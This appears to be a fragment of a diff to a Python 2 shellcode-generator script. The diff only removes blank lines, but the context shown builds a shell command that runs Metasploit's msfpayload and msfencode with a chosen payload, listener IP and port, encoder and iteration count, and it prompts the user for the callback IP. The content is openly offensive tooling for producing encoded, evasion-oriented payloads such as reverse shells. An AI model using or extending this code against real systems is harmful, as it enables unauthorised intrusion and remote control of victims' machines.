@@ -13,16 +13,13 @@ def shellcodeGen(path, encoding, payload, ip, port, iterations, encoder):
 		print ""
 		proc = subp.Popen("%s/msfpayload %s LHOST=%s LPORT=%s R | %s/msfencode -c %s -e %s -t c | tr -d '\"' | tr -d '\n' | sed 's/unsigned char buf\[\] \= //'" \
 							% (path, payload, ip, port, path, iterations, encoder), shell=True, stdout=subp.PIPE)
-
 		shellcode = proc.communicate()[0]
 		shellcode = shellcode.strip(';')
-	
 	elif encoding == '2':
 		PrintInfo("Generating shellcode")
 		print ""
 		proc = subp.Popen("%s/msfpayload %s LHOST=%s LPORT=%s C | tr -d '\"' | tr -d '\n' | sed 's/unsigned char buf\[\] \= //'" \
 							% (path, payload, ip, port), shell=True, stdout=subp.PIPE)
-
 		shellcode = proc.communicate()[0]
 		shellcode = shellcode.strip(';')
 
@@ -91,7 +88,6 @@ while 1:
 		if not encoding:
 			encoding = "1"
 	
-		#			
 		# get some user info
 		ip = raw_input("\n Enter your local or remote ip (%s): " % iface)
 		if ip == '':
